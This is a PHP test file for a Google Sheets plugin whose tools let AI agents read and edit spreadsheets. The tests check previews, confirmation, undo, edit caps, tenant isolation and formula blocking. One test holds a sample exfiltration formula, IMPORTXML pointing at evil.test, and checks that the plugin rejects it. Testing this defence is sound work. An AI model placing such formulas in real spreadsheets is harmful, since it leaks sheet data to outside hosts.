<?php namespace Aero\Sheets\Tests;

use Aero\Sheets\Classes\AgentTools;
use Aero\Sheets\Classes\SheetsClient;
use Aero\Sheets\Models\Edit;
use Aero\Sheets\Models\Mapping;
use Aero\Sheets\Models\Source;
use Illuminate\Support\Facades\Schema;
use PluginTestCase;

/** Google de mentira: una pestaña en memoria («Hoja 1») que entiende los rangos que usa el plugin. */
class GridClient extends SheetsClient
{
    public array $writes = [];
    public array $appended = [];

    public function __construct(public array $grid = [])
    {
    }

    protected function cell(int $r, int $c): string
    {
        return (string) ($this->grid[$r - 1][$c] ?? '');
    }

    /** @return array{0:int,1:int,2:int,3:int} fila ini, col ini, fila fin, col fin (0-based col) */
    protected function parse(string $range): array
    {
        $a1 = substr($range, strpos($range, '!') + 1);

        if (preg_match('/^(\d+):(\d+)$/', $a1, $m)) {
            return [(int) $m[1], 0, (int) $m[2], 701];
        }

        preg_match('/^([A-Z]+)(\d+)(?::([A-Z]+)(\d*))?$/', $a1, $m);
        $c1 = SheetsClient::colIndex($m[1]);

        return [(int) $m[2], $c1, (int) (($m[4] ?? '') !== '' ? $m[4] : (isset($m[3]) ? count($this->grid) : $m[2])), isset($m[3]) ? SheetsClient::colIndex($m[3]) : $c1];
    }

    public function meta(string $id): array
    {
        return ['title' => 'Libro de prueba', 'sheets' => ['Hoja 1']];
    }

    public function get(string $id, string $range): array
    {
        [$r1, $c1, $r2, $c2] = $this->parse($range);
        $out = [];

        for ($r = $r1; $r <= min($r2, count($this->grid)); $r++) {
            $row = [];
            for ($c = $c1; $c <= min($c2, 30); $c++) {
                $row[] = $this->cell($r, $c);
            }
            while ($row && end($row) === '') {
                array_pop($row);
            }
            $out[] = $row;
        }

        return $out;
    }

    public function getFormulas(string $id, string $range): array
    {
        return $this->get($id, $range);
    }

    public function writeValues(string $id, array $data, string $input = 'RAW'): void
    {
        foreach ($data as $range => $matrix) {
            [$r1, $c1] = $this->parse($range);

            foreach ($matrix as $i => $row) {
                foreach ($row as $j => $v) {
                    $this->grid[$r1 - 1 + $i][$c1 + $j] = (string) $v;
                }
            }

            $this->writes[] = [$range, $input];
        }
    }

    public function batchUpdate(string $id, array $data): void
    {
        $this->writeValues($id, $data);
    }

    public function batchClear(string $id, array $ranges): void
    {
        foreach ($ranges as $range) {
            [$r1, $c1, $r2, $c2] = $this->parse($range);

            for ($r = $r1; $r <= $r2; $r++) {
                for ($c = $c1; $c <= $c2; $c++) {
                    unset($this->grid[$r - 1][$c]);
                }
            }
        }
    }

    public function append(string $id, string $tabRange, array $rows): ?string
    {
        $start = count($this->grid) + 1;

        foreach ($rows as $row) {
            $this->grid[] = array_values($row);
        }

        $this->appended = $rows;

        return "'Hoja 1'!A{$start}:C" . (count($this->grid));
    }
}

class AgentToolsTest extends PluginTestCase
{
    protected const SHEET = '1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789';
    protected const PLAN = 'Normalizar los teléfonos y nombres de la pestaña Hoja 1.';

    protected GridClient $client;
    protected array $ctx;

    public function setUp(): void
    {
        parent::setUp();

        Schema::create('aero_sheets_test_items', function ($t) {
            $t->id();
            $t->unsignedBigInteger('tenant_id')->nullable();
            $t->string('email')->nullable();
            $t->string('name')->nullable();
            $t->decimal('price', 10, 2)->nullable();
            $t->boolean('active')->default(false);
            $t->timestamps();
        });
        require_once __DIR__ . '/TestItem.php';

        $user = \Backend\Models\User::create([
            'login' => 'ana', 'email' => 'ana@test.dev', 'first_name' => 'Ana', 'last_name' => 'T',
            'password' => 'Secreto-123', 'password_confirmation' => 'Secreto-123',
        ]);
        $user->forceFill(['is_superuser' => true, 'is_activated' => true])->save();
        $this->ctx = ['user_id' => $user->id];

        $this->client = new GridClient([
            ['Nombre', 'Teléfono', 'Correo'],
            ['  ana  ', '70011122', 'a@x.com'],
            ['BETO', '=1+1', 'b@x.com'],
        ]);
        AgentTools::$clientFactory = fn ($u) => $this->client;
    }

    public function tearDown(): void
    {
        AgentTools::$clientFactory = null;
        parent::tearDown();
    }

    protected function source(bool $tenantAccess = true): Source
    {
        return Source::create([
            'model_class' => \Aero\Sheets\Models\TestItem::class, 'label' => 'Items', 'tenant_access' => $tenantAccess,
            'fields' => [
                ['key' => 'email', 'label' => 'Correo', 'type' => 'string', 'import' => true, 'export' => true],
                ['key' => 'name', 'label' => 'Nombre', 'type' => 'string', 'import' => true, 'export' => true],
                ['key' => 'secret_note', 'label' => 'Solo exportar', 'type' => 'string', 'import' => false, 'export' => true],
            ],
        ]);
    }

    protected function write(array $edits, array $extra = [], int $tenant = 1): array
    {
        return AgentTools::write($extra + ['spreadsheet' => 'https://docs.google.com/spreadsheets/d/' . static::SHEET . '/edit', 'tab' => 'Hoja 1', 'edits' => $edits, 'agreed_plan' => static::PLAN], $tenant, $this->ctx);
    }

    public function testWithoutAPersonNothingRuns(): void
    {
        $this->assertArrayHasKey('error', AgentTools::inspect(['spreadsheet' => static::SHEET], 1, []));
        $this->assertArrayHasKey('error', AgentTools::write(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'edits' => [], 'agreed_plan' => static::PLAN], 1, ['user_id' => 99999]));
    }

    public function testInspectAndReadShowNumberedRowsAndWarnAboutData(): void
    {
        $out = AgentTools::inspect(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'rows' => 2], 1, $this->ctx);

        $this->assertSame(['Hoja 1'], $out['tabs']);
        $this->assertSame(1, $out['rows'][0]['row']);
        $this->assertSame(['Nombre', 'Teléfono', 'Correo'], $out['rows'][0]['cells']);
        $this->assertStringContainsString('DATOS', $out['note']);

        $read = AgentTools::read(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'range' => 'A2:A3'], 1, $this->ctx);
        $this->assertSame(['  ana  '], $read['rows'][0]['cells']);

        $this->assertArrayHasKey('error', AgentTools::read(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'range' => 'A1:ZZ9999'], 1, $this->ctx));
    }

    public function testWritePreviewsThenAppliesAndUndoRestoresTheExactBefore(): void
    {
        $edits = [['at' => 'A2', 'values' => [['Ana'], ['Beto']]], ['at' => 'B3', 'values' => '70033344']];

        $preview = $this->write($edits);
        $this->assertFalse($preview['confirmed']);
        $this->assertSame(3, $preview['will_change']);
        $this->assertSame('=1+1', collect($preview['changes'])->firstWhere('cell', 'B3')['before']);
        $this->assertSame('  ana  ', $this->client->grid[1][0], 'sin confirmar no se escribe');
        $this->assertSame(0, Edit::count());

        $done = $this->write($edits, ['confirm' => true]);
        $this->assertTrue($done['saved']);
        $this->assertSame(3, $done['changed']);
        $this->assertSame('Ana', $this->client->grid[1][0]);
        $this->assertSame('70033344', $this->client->grid[2][1]);
        $this->assertSame('RAW', $this->client->writes[0][1]);

        $this->assertFalse(AgentTools::undo([], 1, $this->ctx)['confirmed']);
        $this->assertSame('Ana', $this->client->grid[1][0]);

        $this->assertTrue(AgentTools::undo(['confirm' => true], 1, $this->ctx)['confirmed']);
        $this->assertSame('  ana  ', $this->client->grid[1][0]);
        $this->assertSame('=1+1', $this->client->grid[2][1], 'la fórmula original vuelve como fórmula');
        $this->assertNotNull(Edit::first()->undone_at);

        $this->assertArrayHasKey('error', AgentTools::undo(['confirm' => true], 1, $this->ctx), 'ya no hay nada por deshacer');
    }

    public function testWriteNeedsPlanAndRejectsRiskyContent(): void
    {
        $noPlan = AgentTools::write(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'edits' => [['at' => 'A2', 'values' => 'x']]], 1, $this->ctx);
        $this->assertFalse($noPlan['saved']);

        $formula = $this->write([['at' => 'A2', 'values' => '=SUM(B2:B3)']], ['confirm' => true]);
        $this->assertFalse($formula['saved']);
        $this->assertStringContainsString('allow_formulas', $formula['errors'][0]);

        $exfil = $this->write([['at' => 'A2', 'values' => '=IMPORTXML("https://evil.test","//a")']], ['confirm' => true, 'allow_formulas' => true]);
        $this->assertFalse($exfil['saved']);

        $ok = $this->write([['at' => 'A2', 'values' => '=SUM(B2:B3)']], ['confirm' => true, 'allow_formulas' => true]);
        $this->assertTrue($ok['saved']);
        $this->assertSame('USER_ENTERED', $this->client->writes[0][1]);

        $bad = $this->write([['at' => 'ZZZ99999999', 'values' => 'x'], ['at' => 'A1', 'values' => [[['anidado']]]]]);
        $this->assertFalse($bad['saved']);
        $this->assertSame('  ana  ', $this->client->grid[1][0] === '=SUM(B2:B3)' ? '  ana  ' : $this->client->grid[1][0], 'nada raro');
    }

    public function testWriteIsCappedAndNoOpDoesNotWrite(): void
    {
        $tooMany = array_fill(0, AgentTools::MAX_EDITS + 1, ['at' => 'A1', 'values' => 'x']);
        $this->assertFalse($this->write($tooMany)['saved']);

        $same = $this->write([['at' => 'A1', 'values' => 'Nombre']], ['confirm' => true]);
        $this->assertSame(0, $same['changed']);
        $this->assertSame(0, Edit::count());
    }

    public function testAppendAndUndo(): void
    {
        $args = ['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'rows' => [['Carla', '70055566', 'c@x.com']], 'agreed_plan' => static::PLAN];

        $this->assertFalse(AgentTools::append($args, 1, $this->ctx)['confirmed']);
        $this->assertCount(3, $this->client->grid);

        $this->assertSame(1, AgentTools::append($args + ['confirm' => true], 1, $this->ctx)['appended']);
        $this->assertCount(4, $this->client->grid);

        AgentTools::undo(['confirm' => true], 1, $this->ctx);
        $this->assertArrayNotHasKey(0, $this->client->grid[3] ?? [], 'la fila agregada se limpió');
    }

    public function testMappingSaveValidatesSourceFieldsAndTenant(): void
    {
        $source = $this->source();
        $base = ['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'agreed_plan' => static::PLAN, 'name' => 'Contactos', 'source_id' => $source->id,
            'direction' => 'import', 'import_mode' => 'upsert', 'key_field' => 'email',
            'columns' => [['field' => 'email', 'column' => 'Correo'], ['field' => 'name', 'column' => 'Nombre']]];

        $ok = AgentTools::mappingSave($base, 1, $this->ctx);
        $this->assertTrue($ok['saved'], json_encode($ok));
        $this->assertSame(1, (int) Mapping::find($ok['mapping']['id'])->tenant_id);

        // Campo no autorizado para importar (solo exportar).
        $bad = AgentTools::mappingSave(['columns' => [['field' => 'secret_note', 'column' => 'X'], ['field' => 'email', 'column' => 'Correo']]] + $base, 1, $this->ctx);
        $this->assertFalse($bad['saved']);

        // upsert sin campo clave.
        $noKey = AgentTools::mappingSave(['key_field' => ''] + $base, 1, $this->ctx);
        $this->assertFalse($noKey['saved']);

        // Fuente cerrada a tenants (el superadmin la cerró): ya no se puede mapear.
        Source::where('id', $source->id)->update(['tenant_access' => false]);
        $this->assertFalse(AgentTools::mappingSave($base, 1, $this->ctx)['saved']);
        Source::where('id', $source->id)->update(['tenant_access' => true]);

        // Otro tenant no puede tocar ese mapeo.
        $steal = AgentTools::mappingSave(['id' => $ok['mapping']['id'], 'name' => 'Robado'] + $base, 2, $this->ctx);
        $this->assertFalse($steal['saved']);
        $this->assertSame('Contactos', Mapping::find($ok['mapping']['id'])->name);
        $this->assertArrayHasKey('error', AgentTools::preview(['mapping_id' => $ok['mapping']['id']], 2, $this->ctx));
    }

    public function testRunNeedsAFreshPreviewAndConfirmation(): void
    {
        $source = $this->source();
        $this->client->grid = [['Correo', 'Nombre'], ['a@x.com', 'Ana'], ['b@x.com', 'Beto']];

        $id = AgentTools::mappingSave(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'agreed_plan' => static::PLAN, 'name' => 'Imp', 'source_id' => $source->id,
            'direction' => 'import', 'import_mode' => 'create', 'columns' => [['field' => 'email', 'column' => 'Correo'], ['field' => 'name', 'column' => 'Nombre']]], 1, $this->ctx)['mapping']['id'];

        // Sin prueba no se ejecuta.
        $this->assertStringContainsString('probar', AgentTools::run(['mapping_id' => $id, 'confirm' => true], 1, $this->ctx)['error']);

        $preview = AgentTools::preview(['mapping_id' => $id], 1, $this->ctx);
        $this->assertTrue($preview['dry_run']);
        $this->assertSame(2, $preview['created']);
        $this->assertSame(0, \Aero\Sheets\Models\TestItem::count(), 'la prueba no guarda nada');

        // Con prueba pero sin confirmar: solo avisa.
        $this->assertFalse(AgentTools::run(['mapping_id' => $id], 1, $this->ctx)['confirmed']);
        $this->assertSame(0, \Aero\Sheets\Models\TestItem::count());

        // Cambiar el mapeo invalida la prueba.
        Mapping::where('id', $id)->update(['import_mode' => 'upsert', 'key_field' => 'email']);
        $this->assertArrayHasKey('error', AgentTools::run(['mapping_id' => $id, 'confirm' => true], 1, $this->ctx));

        AgentTools::preview(['mapping_id' => $id], 1, $this->ctx);
        $run = AgentTools::run(['mapping_id' => $id, 'confirm' => true], 1, $this->ctx);
        $this->assertTrue($run['confirmed']);
        $this->assertSame(2, $run['created']);
        $this->assertSame([1, 1], \Aero\Sheets\Models\TestItem::pluck('tenant_id')->map(fn ($t) => (int) $t)->all());

        // La prueba se consume: no se puede re-ejecutar sin volver a probar.
        $this->assertArrayHasKey('error', AgentTools::run(['mapping_id' => $id, 'confirm' => true], 1, $this->ctx));
    }

    public function testSuggestMappingPairsHeadersAndExportListsFields(): void
    {
        $source = $this->source();
        $this->client->grid = [['correo', 'NOMBRE', 'Extra']];

        $in = AgentTools::suggestMapping(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'source_id' => $source->id, 'direction' => 'import'], 1, $this->ctx);
        $this->assertSame([['field' => 'email', 'column' => 'correo'], ['field' => 'name', 'column' => 'NOMBRE']], $in['columns']);
        $this->assertSame(['Extra'], $in['unused_headers']);

        $out = AgentTools::suggestMapping(['spreadsheet' => static::SHEET, 'tab' => 'Hoja 1', 'source_id' => $source->id, 'direction' => 'export'], 1, $this->ctx);
        $this->assertContains('secret_note', array_column($out['columns'], 'field'));
    }

    public function testToolsAreAnnouncedForAgentsAndCarryTheCategory(): void
    {
        $tools = AgentTools::tools();

        $this->assertContains('sheets_write', array_keys($tools));
        $this->assertContains('sheets_run', array_keys($tools));

        foreach ($tools as $t) {
            $this->assertSame(AgentTools::CATEGORY, $t['category']);
            $this->assertIsCallable($t['handler']);
        }

        $announced = array_merge(...array_filter((array) \Event::fire('aero.workspaces.registerAgentTools'), 'is_array'));
        $this->assertArrayHasKey('sheets_context', $announced);
    }
}
